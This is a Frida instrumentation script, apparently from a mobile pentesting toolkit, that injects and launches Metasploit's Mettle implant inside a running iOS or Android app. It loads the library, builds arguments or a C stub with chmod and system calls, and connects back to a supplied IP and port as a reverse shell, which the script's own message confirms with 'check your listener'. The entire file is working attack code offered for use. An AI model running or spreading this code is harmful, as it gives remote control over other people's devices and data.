rpc.exports = {
  initMettle: function (dlib) {
    const NSDocumentDirectory = 9;
    const NSUserDomainMask = 1
    const p = ObjC.classes.NSFileManager.defaultManager()
      .URLsForDirectory_inDomains_(NSDocumentDirectory, NSUserDomainMask).lastObject().path();

    ObjC.schedule(ObjC.mainQueue, function () {
      Module.load(p + '/' + dlib);
    });
  },
  connectMettleIOs: function(dlib, ip, port) {
    var source = "#include <glib.h>" +
    "char **getargs() {" +
    "    char **argv = g_malloc(3 * sizeof(char*));" +
    "    argv[0] = \"mettle\";" +
    "    argv[1] = \"-u\";" +
    "    argv[2] = \"tcp://{ip}:{port}\";" +
    "    return argv;" +
    "}";

    // update with the target ip:port
    source = source.replace("{ip}", ip);
    source = source.replace("{port}", port);

    const cm = new CModule(source);
    const argv = new NativeFunction(cm.getargs, 'pointer', []);

    const mettle = Process.getModuleByName(dlib);
    const mettleMainPtr = mettle.findExportByName('main');
    console.log('Found mettle::main @ ' + mettleMainPtr);
    const mettleMain = new NativeFunction(mettleMainPtr, 'void', ['int', 'pointer']);

    // don't block the ui
    ObjC.schedule(ObjC.mainQueue, function () {
      console.log('Calling mettleMain()');
      mettleMain(3, argv());
    });
  },
  connectMettleAndroid: function(mettle_droid_path,ip, port) {
		var code = "#include <stdio.h>\n";
		code+="#include <stdlib.h>\n";
		code+="#include <gum/guminterceptor.h>\n";
		code+="extern int system (const char * m);\n";
		code+="extern int strlen (const char * m);\n";
		code+="int main(int a, int b) { \n";
		code+="system(\"/system/bin/chmod +x "+mettle_droid_path+"\");\n";
		code+="int u = system (\""+mettle_droid_path+" -b 1 -u tcp://{ip}:{port}\");\n"
		code+="return u;\n";
		code+="}\n";
		// update with the target ip:port;
		code = code.replace("{ip}", ip);
    		code = code.replace("{port}", port);
		const cm = new CModule(code);
		var mettle_droid = new NativeFunction(cm.main,'int',[]);
		mettle_droid();
		console.log("Mettle successfully connected! check your listener.");
  }
}
